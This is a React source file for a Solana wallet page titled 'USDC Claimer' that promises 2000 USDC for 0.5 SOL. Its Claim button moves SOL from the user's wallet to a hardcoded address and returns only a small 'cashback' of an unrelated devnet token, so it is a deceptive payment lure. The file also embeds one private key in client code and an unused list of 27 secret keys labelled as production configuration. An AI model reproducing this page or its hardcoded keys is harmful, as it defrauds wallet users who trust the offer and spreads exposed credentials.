/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2DUjBbLf9NZHRG4DCvL3bt1192KV7cYf64U3axor83fzr8bmTahyUi1idseeqmim7qCFNe5GbBujoKbZ5q4cqRkR"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3FaykxyZ9kzCWTCjvKmeUPkrFxicDbP134D8R2tyABdM8Pk8n4MVVXs1e6taw5JYixhxGUcm8rbjVxPgL9j85otX",
  "key1": "5hCS7g545xFCxT7Kgpphm8GRkBq7bASbS8ETMqJmkJni7bRYed2VBQGzSbfnzj8Kqz5HerdyoDPi8GtpGCn7D7TJ",
  "key2": "twhUaZFzvKqpgNQAugnqKj1yiFaQFBd9cu5HyvUk2xCgx9A9CxScrvsHjJeuYKJV7TKku1rKXMrwNTawvzZEmsK",
  "key3": "5vZpaq5ix9vmGAeS29zvAXtjTehhBwWcjq4osBEoYm18vs6Bgcd7tNDUyivRqki956WaMLSxKr1nJHxwbxRodnAp",
  "key4": "5TRb9Yy3W6mpF7g3ByHsJwAJBe6mwoAcBq6fSFW9popzDBmYmWRzmbkH5QtKpm15Wu1pDHCb4vEQTgfNGkJqvtRh",
  "key5": "2g5t3zYsdyPTdLo6hTgagZ2QNq6vunS7oFmcH8nsFaQfZt83Hk8vqnFbqniv9XW2pMTVax8i3rsnMpfNJRmqCkz6",
  "key6": "4kGK1Ujwr6msjifEMPpoMGitgE2rTBx1eLoyeEw5iQ9U9huCWzfDDposkM3GTVdnF9sVUhgpVArGamBhyYvTnz2B",
  "key7": "3ueDtn4nnqPSEQRFWNDqhxazkbqePJSShqR71FpewWrnCt6x35CdJ9rwhf1xVH41YTyzact2vRqqtE7HsGjEpczd",
  "key8": "34KfGkFULTWGkg7FRUQ22DvDTYi8PyrsTrgph2iJjKeEAi3JKwpQTjWNnsK7oPXJjhju4oRr66kaEFuVnMbLPw1z",
  "key9": "GL47Ee93CbCy8YFfsUUNmc1FqBqyt5qSMfUivwQQ7Dj9hdz5Zb3xA9sSM5bXxm8LuVNbNBgPKbd1uP9jqfUUpXR",
  "key10": "3rf4e9s2oHqg5N4BNDCnBbavXsCoYUZeHVAdMfcseyR8HoRQCHr5vBcsdrLxQZA3yugNxcrfPEKcd2iXWrWAeBuo",
  "key11": "5VRp1GyB5KFffm1R6jXV4DXhASF8riRHWi1kuKiwi2oLW9cGcwGdbDpUUsqtvJJe3HGgrUHiqC6yPtyAW9AkAdER",
  "key12": "3mrMfiCDSTd8ALP6txbxGTdQKuDmYaydX4Q1mjYSzVtuSE3YBE4LFBbS7iwBqj2tc34BnekbsmaHbB2Xcmi2cpk9",
  "key13": "29JebuyVXw6GAeatEPr2Giz2k7wJTwxw76NWJeyUMGKUXVHczK2wSaQ17TR585xed6JzSbqdWFGCKPPfKm1LuVHv",
  "key14": "5ia9pbhj8kKukhBXNzv7ZxgiFZPZ5av7y7utEXvsnRzfupSaPirZmy9ShxMJjHpgtqiFk6bQukYeyghzUW2vdRqz",
  "key15": "CiEKrJjGDTwTrqr97XbkSXgxfPFar5XowxYxTn6489p7GrXE5j29FWtaNYPEdgvqpoT7tQXzBHVZgbDRucyRx98",
  "key16": "5PFSt8o73proksnGksbXvz1v2pUiQCfiFsAvS4aCeiW2BUoCXRnQQvP5RZmkaJzio3h8gvzYR2H7q6W2ULYgnyjD",
  "key17": "zfzyZ98ksqGUF493n4JcaoMKkJqJ4uJVVy8d3PujoEwSfvgbhZk6HXJ2GNQ8BRPqP5XKZdPGFbbUK5ywVqbATDZ",
  "key18": "TSqQQp3z2xkBYat58t9oqSSaqK4tSKK6cvqhHEirBW5Lr4aKJzZZaFBeqQkH3ajuF4W2NjYNTf9ASYk5GC7hQuq",
  "key19": "Aqz1j3cd4DkfMnfFgFZibEiL4V3aJDr3xc62jR21yEidc7hSX6wPpzvbL9iNn8FnhfuJ2tPqrextqJA66Kujr3P",
  "key20": "8XZ8K4KBTNsHMpBBPJd4LRtuVGfov8wez63cks2br6UeRHfsXgpAzCYSWRp81h25ShTShiVRyR3Gtd2ZXSWiPkn",
  "key21": "35ygZq412a3DvsbTJfSmks4XYpsACUd2fbVRrR8X6NoCEkiTAfnuQEG2zLBZTUN2teVqyLkPVE3ZkzPM9saGA8HW",
  "key22": "4yvKBieZWfyzEAqzq2KybQP8UjPvaUcQtzf3mQdJefqQe8ogE3RNdH9s1iWbuH5jzg1ih8Zn2zWcLexKnf6DGmvp",
  "key23": "5MGvNASsRnCNJjkwvAn6tTgQfAycMKf7d46an9mRbFqFjsAmi3fHjMeRFAfUcoP4nVw7XL8iGuoXPjKFYcGiveYv",
  "key24": "4Q3ai2qRALx2a22T5qu5LCgWcqHPdvyPrBMrKRWm8y4BR8vgjwS5ajVhjqSaDmKRpDJc78WA1mA7yQFWVZaCMSiu",
  "key25": "35DuJ1b2XrKB2y2wzDmV7bUCXAcdEtaynwzzEPNDkQ1g5v9VRRkBbNqZ4XwTWTzZjkJywADELA7uzj3sioNgsmxQ",
  "key26": "52iAtCi5PSaBXbs3RvqBHJiePiVskXQtKb34R4pmEC35em1hsRAUzMEre6dxr2a7LeYPAtyXV7NBv4wrbU1ifnzj"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
